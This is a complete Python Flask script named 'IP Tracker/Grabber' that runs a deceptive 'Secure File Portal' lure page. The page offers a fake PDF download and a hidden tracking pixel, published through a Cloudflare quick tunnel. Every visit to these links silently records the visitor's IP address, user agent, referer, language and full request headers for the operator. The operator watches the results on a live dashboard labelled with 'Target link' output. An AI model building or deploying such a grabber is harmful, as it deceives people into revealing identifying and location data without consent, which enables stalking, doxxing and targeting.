#!/usr/bin/env python3
import json
import datetime
import subprocess
import re
import os
import signal
from flask import Flask, request, Response, jsonify

app = Flask(__name__)
LOG_FILE = "captured.json"
BRAND = "IP Tracker/Grabber"
CREDIT = "Created by Karim Mantash (DedsecLB)"

def log_hit(extra=None):
    entry = {
        "time": datetime.datetime.utcnow().isoformat() + "Z",
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip(),
        "user_agent": request.headers.get("User-Agent"),
        "referer": request.headers.get("Referer"),
        "lang": request.headers.get("Accept-Language"),
        "method": request.method,
        "path": request.path,
        "params": request.args.to_dict(),
        "headers": dict(request.headers),
    }
    if extra:
        entry.update(extra)
    try:
        with open(LOG_FILE) as f:
            logs = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        logs = []
    logs.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)
    print(f"[+] HIT: {entry['ip']}  UA: {entry['user_agent']}")
    return logs

# ---------------- Landing page (what the target sees) ----------------

LANDING = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure File Portal</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    min-height:100vh; display:flex; align-items:center; justify-content:center;
    background:#0a0a0f; font-family:'Segoe UI',sans-serif; color:#fff; overflow:hidden;
  }
  .glow {
    position:fixed; width:600px; height:600px; border-radius:50%;
    filter:blur(150px); opacity:.25; animation:float 8s infinite alternate;
    background:linear-gradient(45deg,#ff004c,#7b00ff,#00fff2);
  }
  @keyframes float { from{transform:translate(-200px,-200px)} to{transform:translate(200px,200px)} }
  .card {
    position:relative; background:rgba(15,15,25,.85); border:1px solid rgba(123,0,255,.4);
    border-radius:16px; padding:40px; max-width:380px; width:90%;
    box-shadow:0 0 40px rgba(123,0,255,.25); backdrop-filter:blur(10px);
    animation:fadeIn .8s ease;
  }
  @keyframes fadeIn { from{opacity:0; transform:translateY(20px)} to{opacity:1} }
  .logo { font-size:40px; margin-bottom:12px;
    background:linear-gradient(90deg,#ff004c,#7b00ff,#00fff2);
    -webkit-background-clip:text; background-clip:text; color:transparent; }
  h1 { font-size:22px; margin-bottom:8px; }
  p  { color:#9a9ab0; font-size:14px; line-height:1.6; margin-bottom:24px; }
  .btn { display:block; text-align:center; text-decoration:none; padding:14px;
    border-radius:10px; font-weight:600; color:#fff;
    background:linear-gradient(90deg,#ff004c,#7b00ff,#00fff2);
    background-size:200% 100%; animation:slide 3s linear infinite; }
  @keyframes slide { to { background-position:200% 0 } }
  .footer { margin-top:26px; text-align:center; font-size:13px; font-weight:700;
    background:linear-gradient(90deg,#ff004c,#7b00ff,#00fff2,#ff004c);
    background-size:300% 100%; -webkit-background-clip:text; background-clip:text;
    color:transparent; animation:slide 4s linear infinite; }
</style>
</head>
<body>
  <div class="glow"></div>
  <div class="card">
    <div class="logo">&#128274;</div>
    <h1>Secure File Portal</h1>
    <p>Your requested document is ready. Click below to download it securely.</p>
    <a class="btn" href="/report.pdf">&#11015;&#65039; Download File</a>
    <div class="footer">Created by Karim Mantash (DedsecLB)</div>
  </div>
</body>
</html>"""

# ---------------- RGB Dashboard ----------------

DASH = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IP Tracker/Grabber — Dashboard</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:#050508; color:#e0e0e8; font-family:monospace; padding:30px; }
  h1 { font-size:28px; margin-bottom:4px;
    background:linear-gradient(90deg,#ff004c,#ff8a00,#ffee00,#00ff88,#00cfff,#7b00ff,#ff004c);
    background-size:300% 100%; -webkit-background-clip:text; background-clip:text;
    color:transparent; animation:rgb 5s linear infinite; }
  .credit { font-size:14px; font-weight:bold; margin-bottom:24px;
    background:linear-gradient(90deg,#ff004c,#7b00ff,#00fff2,#ff004c);
    background-size:300% 100%; -webkit-background-clip:text; background-clip:text;
    color:transparent; animation:rgb 3s linear infinite; }
  @keyframes rgb { to { background-position:300% 0 } }
  table { width:100%; border-collapse:collapse; font-size:13px; }
  th { text-align:left; color:#00fff2; border-bottom:1px solid #333; padding:8px 6px; }
  td { padding:7px 6px; border-bottom:1px solid #1a1a24; word-break:break-all; }
  tr:hover td { background:rgba(123,0,255,.08); }
  .ip { color:#ffee00; font-weight:bold; }
  .ua { color:#8a8aa0; font-size:12px; }
  .badge { display:inline-block; padding:2px 8px; border-radius:6px; font-size:11px;
    background:linear-gradient(90deg,#7b00ff,#00fff2); color:#fff; }
  .empty { color:#555; padding:40px; text-align:center; }
  .refresh { margin-bottom:14px; color:#666; font-size:12px; }
</style>
</head>
<body>
  <h1>&#9760; IP Tracker/Grabber &#9760;</h1>
  <div class="credit">Created by Karim Mantash (DedsecLB)</div>
  <div class="refresh">Auto-refreshing every 3s...</div>
  <table>
    <tr><th>Time</th><th>IP</th><th>Path</th><th>Params</th><th>User Agent</th></tr>
    <tbody id="rows"><tr><td colspan="5" class="empty">No hits yet — share the link!</td></tr></tbody>
  </table>
<script>
async function load() {
  const logs = await (await fetch('/api/logs')).json();
  const rows = document.getElementById('rows');
  if (!logs.length) return;
  rows.innerHTML = logs.slice().reverse().map(l => `
    <tr>
      <td>${l.time}</td>
      <td class="ip">${l.ip}</td>
      <td><span class="badge">${l.path}</span></td>
      <td>${JSON.stringify(l.params)}</td>
      <td class="ua">${l.user_agent || ''}</td>
    </tr>`).join('');
}
setInterval(load, 3000); load();
</script>
</body>
</html>"""

@app.route("/")
def landing():
    log_hit()
    return LANDING

@app.route("/logs")
def dash():
    return DASH

@app.route("/api/logs")
def api_logs():
    try:
        with open(LOG_FILE) as f:
            return jsonify(json.load(f))
    except FileNotFoundError:
        return jsonify([])

@app.route("/image.jpg")
def pixel():
    log_hit()
    png = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01"
           b"\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
           b"\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r"
           b"\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82")
    return Response(png, mimetype="image/png")

@app.route("/report.pdf")
def fake_file():
    log_hit()
    return Response(
        b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj\n"
        b"xref\n0 4\ntrailer<</Size 4/Root 1 0 R>>\n%%EOF",
        mimetype="application/pdf",
        headers={"Content-Disposition": "attachment; filename=report.pdf"},
    )

def start_cloudflared(port):
    """Start a Cloudflare quick tunnel and extract the public URL."""
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    url = None
    for line in proc.stdout:
        m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
        if m:
            url = m.group(0)
            break
    return proc, url

if __name__ == "__main__":
    PORT = 8080
    cf_proc, url = start_cloudflared(PORT)
    if url:
        print(f"\n╔══════════════════════════════════════════╗")
        print(f"║        IP Tracker/Grabber                ║")
        print(f"║   Created by Karim Mantash (DedsecLB)    ║")
        print(f"╚══════════════════════════════════════════╝")
        print(f"\n[+] Target link   : {url}/")
        print(f"[+] Tracking img  : {url}/image.jpg")
        print(f"[+] Direct file   : {url}/report.pdf")
        print(f"[+] Dashboard     : {url}/logs\n")
    else:
        print("[!] Could not get Cloudflare URL — check cloudflared output. Running LAN-only.")

    try:
        app.run(host="127.0.0.1", port=PORT)
    finally:
        cf_proc.terminate()